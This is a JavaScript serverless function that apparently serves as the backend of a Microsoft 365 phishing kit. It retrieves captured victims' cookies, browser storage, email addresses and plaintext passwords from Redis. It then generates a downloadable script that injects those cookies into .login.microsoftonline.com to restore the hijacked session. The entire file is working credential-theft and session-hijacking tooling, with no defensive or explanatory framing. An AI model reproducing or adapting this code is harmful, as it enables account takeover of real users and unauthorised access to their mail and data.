const handler = async (event, context) => {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'GET, OPTIONS',
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: '',
    };
  }

  if (event.httpMethod !== 'GET') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  try {
    // Check environment variables
    const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
    const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

    if (!UPSTASH_REDIS_REST_URL || !UPSTASH_REDIS_REST_TOKEN) {
      console.error('Missing Redis configuration in getCookies');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ 
          error: 'Server configuration error - Redis credentials missing' 
        }),
      };
    }

    // Initialize Redis
    let redis;
    try {
      const { Redis } = await import('@upstash/redis');
      redis = new Redis({
        url: UPSTASH_REDIS_REST_URL,
        token: UPSTASH_REDIS_REST_TOKEN,
      });
    } catch (redisError) {
      console.error('Redis initialization error:', redisError);
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ 
          error: 'Database connection error',
          details: redisError.message
        }),
      };
    }

    // Get client IP
    const getClientIP = () => {
      return event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
             event.headers['x-real-ip'] || 
             event.headers['cf-connecting-ip'] ||
             event.requestContext?.identity?.sourceIp ||
             'Unknown';
    };

    // Get parameters - Fixed URL parsing
    const url = event.queryStringParameters || {};
    const sessionId = url.sessionId;
    const email = url.email;

    console.log('🔍 Getting cookies for:', { sessionId, email });

    if (!sessionId && !email) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'SessionId or email parameter required' }),
      };
    }

    let cookiesData = null;

    // Try to get by session ID first
    if (sessionId) {
      try {
        const sessionData = await redis.get(`session:${sessionId}`);
        if (sessionData) {
          const session = JSON.parse(sessionData);
          cookiesData = {
            cookies: session.formattedCookies || session.cookies || [],
            localStorage: session.localStorage || 'Empty',
            sessionStorage: session.sessionStorage || 'Empty',
            timestamp: session.timestamp,
            email: session.email,
            password: session.password || 'Not captured'
          };
        }
      } catch (error) {
        console.error('Error getting session by ID:', error);
      }
    }

    // Fallback to email lookup
    if (!cookiesData && email) {
      try {
        const userData = await redis.get(`user:${email}`);
        if (userData) {
          const user = JSON.parse(userData);
          cookiesData = {
            cookies: user.formattedCookies || user.cookies || [],
            localStorage: user.localStorage || 'Empty',
            sessionStorage: user.sessionStorage || 'Empty',
            timestamp: user.timestamp,
            email: user.email,
            password: user.password || 'Not captured'
          };
        }
      } catch (error) {
        console.error('Error getting user by email:', error);
      }
    }

    // Try cookies-specific lookup
    if (!cookiesData && sessionId) {
      try {
        const cookieSpecificData = await redis.get(`cookies:${sessionId}`);
        if (cookieSpecificData) {
          cookiesData = JSON.parse(cookieSpecificData);
        }
      } catch (error) {
        console.error('Error getting cookies by session ID:', error);
      }
    }

    if (!cookiesData) {
      return {
        statusCode: 404,
        headers,
        body: JSON.stringify({ 
          error: 'No cookies found for the specified session',
          sessionId: sessionId,
          email: email
        }),
      };
    }

    console.log('✅ Found cookies data:', {
      cookieCount: Array.isArray(cookiesData.cookies) ? cookiesData.cookies.length : 0,
      email: cookiesData.email,
      hasFormattedCookies: Array.isArray(cookiesData.formattedCookies),
      formattedCookieCount: Array.isArray(cookiesData.formattedCookies) ? cookiesData.formattedCookies.length : 0
    });

    const clientIP = getClientIP();
    const userEmail = cookiesData.email || 'Not captured';
    const userPassword = cookiesData.password || 'Not captured';
    
    console.log('📊 Processing cookies data:', {
      email: userEmail,
      cookieCount: Array.isArray(cookiesData.cookies) ? cookiesData.cookies.length : 0,
      cookieType: typeof cookiesData.cookies,
      formattedCookieCount: Array.isArray(cookiesData.formattedCookies) ? cookiesData.formattedCookies.length : 0
    });

    // Process cookies with improved handling
    let processedCookies = [];
    
    // First try formattedCookies if available
    if (Array.isArray(cookiesData.formattedCookies) && cookiesData.formattedCookies.length > 0) {
      processedCookies = cookiesData.formattedCookies.filter(cookie => cookie && cookie.name);
      console.log('✅ Using formattedCookies:', processedCookies.length);
    }
    // Fallback to regular cookies
    else if (Array.isArray(cookiesData.cookies)) {
      processedCookies = cookiesData.cookies.filter(cookie => cookie && cookie.name);
      console.log('✅ Using regular cookies:', processedCookies.length);
    } else if (typeof cookiesData.cookies === 'string' && cookiesData.cookies !== 'No cookies found') {
      try {
        const parsedCookies = JSON.parse(cookiesData.cookies);
        if (Array.isArray(parsedCookies)) {
          processedCookies = parsedCookies.filter(cookie => cookie && cookie.name);
        }
      } catch (e) {
        // Try to parse as document.cookie format
        if (cookiesData.cookies.includes('=')) {
          const cookieStrings = cookiesData.cookies.split(';');
          processedCookies = cookieStrings.map(cookieStr => {
            const [name, ...valueParts] = cookieStr.trim().split('=');
            const value = valueParts.join('=');
            return name && value ? {
              name: name.trim(),
              value: value.trim(),
              domain: '.login.microsoftonline.com',
              path: '/',
              secure: true,
              httpOnly: false,
              sameSite: 'none',
              expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
              hostOnly: false,
              session: false,
              storeId: null
            } : null;
          }).filter(cookie => cookie !== null);
        }
      }
    }
    
    // Also check documentCookies if available
    if (processedCookies.length === 0 && cookiesData.documentCookies && typeof cookiesData.documentCookies === 'string') {
      const cookieStrings = cookiesData.documentCookies.split(';');
      processedCookies = cookieStrings.map(cookieStr => {
        const [name, ...valueParts] = cookieStr.trim().split('=');
        const value = valueParts.join('=');
        return name && value ? {
          name: name.trim(),
          value: value.trim(),
          domain: '.login.microsoftonline.com',
          path: '/',
          secure: true,
          httpOnly: false,
          sameSite: 'none',
          expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
          hostOnly: false,
          session: false,
          storeId: null
        } : null;
      }).filter(cookie => cookie !== null);
      console.log('✅ Using documentCookies:', processedCookies.length);
    }

    const formattedCookies = processedCookies.map(cookie => ({
      ...cookie,
      domain: '.login.microsoftonline.com',
      expirationDate: cookie.expirationDate || Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
      hostOnly: cookie.hostOnly !== undefined ? cookie.hostOnly : false,
      httpOnly: cookie.httpOnly !== undefined ? cookie.httpOnly : false,
      name: cookie.name || '',
      path: cookie.path || '/',
      sameSite: cookie.sameSite || 'none',
      secure: cookie.secure !== undefined ? cookie.secure : true,
      session: cookie.session !== undefined ? cookie.session : false,
      storeId: cookie.storeId || null,
      value: cookie.value || ''
    }));

    // Create JavaScript injection code
    const jsInjectionCode = formattedCookies.length > 0 ? 
      `!function(){console.log("%c COOKIES LOADED","background:greenyellow;color:#fff;font-size:30px;");let e=JSON.parse(${JSON.stringify(JSON.stringify(formattedCookies))});for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}\${o.secure?"Secure;":""}\${o.sameSite?\`SameSite=\${o.sameSite};\`:"SameSite=no_restriction;"}\`;console.log("Cookie set:",o.name);setTimeout(()=>location.reload(),1000)}();` :
      `console.log("%c NO COOKIES AVAILABLE","background:red;color:#fff;font-size:30px;");alert("No cookies found for this session.");`;

    // Create the output
    const output = `// Microsoft 365 Cookie restoration for ${userEmail}
// Generated: ${new Date().toISOString()}
// Cookies found: ${formattedCookies.length}
// Session ID: ${sessionId}
// Email: ${userEmail}

let ipaddress = "${clientIP}";
let email = "${userEmail}";
let password = "${userPassword}";
let sessionId = "${sessionId}";

console.log("Session Info:", {email, password, cookieCount: ${formattedCookies.length}});

${jsInjectionCode}

// Cookie Data:
${JSON.stringify(formattedCookies, null, 2)}

// Local Storage:
// ${cookiesData.localStorage || 'Empty'}

// Session Storage:
// ${cookiesData.sessionStorage || 'Empty'}`;

    return {
      statusCode: 200,
      headers: {
        ...headers,
        'Content-Type': 'text/javascript',
        'Content-Disposition': `attachment; filename="microsoft365_cookies_${userEmail.replace('@', '_at_')}_${Date.now()}.js"`,
      },
      body: output,
    };

  } catch (error) {
    console.error('❌ Error in getCookies function:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ 
        error: 'Internal server error',
        details: error.message,
        timestamp: new Date().toISOString()
      }),
    };
  }
};

export { handler };